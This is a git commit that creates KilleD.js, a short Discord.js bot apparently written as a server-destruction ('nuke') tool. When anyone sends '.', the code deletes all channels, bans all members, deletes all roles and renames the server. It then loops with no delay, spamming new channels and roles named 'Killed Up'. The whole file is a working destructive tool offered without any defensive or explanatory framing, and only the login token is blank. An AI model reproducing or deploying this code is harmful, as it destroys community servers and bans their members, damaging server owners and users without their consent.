12174705dfa26c70dcfc328462be93d1568f76e5
KilledDev <88323599+99JOKER99@users.noreply.github.com>
2021-08-09 16:52:44 +0300

    Create KilleD.js

---
+++ KilleD.js
@@ -0,0 +1,28 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const prefix = ".";
+client.on("message", message => {
+  if (message.content === ".") {
+    if (message.channel.guild) {
+      message.guild.channels.forEach(c => {
+        if (c.deletable) {
+          c.delete();
+        }
+      });
+      message.guild.members.forEach(m => {
+        m.ban();
+      });
+      message.guild.roles.forEach(r => {
+        r.delete();
+      });
+      message.guild.setName("Killed Up");////nawek dane bo sar server 
+      setInterval(function() {
+        message.guild.createChannel("Killed Up", "text");///////bo channel 
+        message.guild.createChannel("Killed Up", "voice");////bo voice
+        message.guild.createRole({ name: "Killed Up" });////nawek dane bo role kan
+      });
+    }
+  }
+});
+
+client.login("")
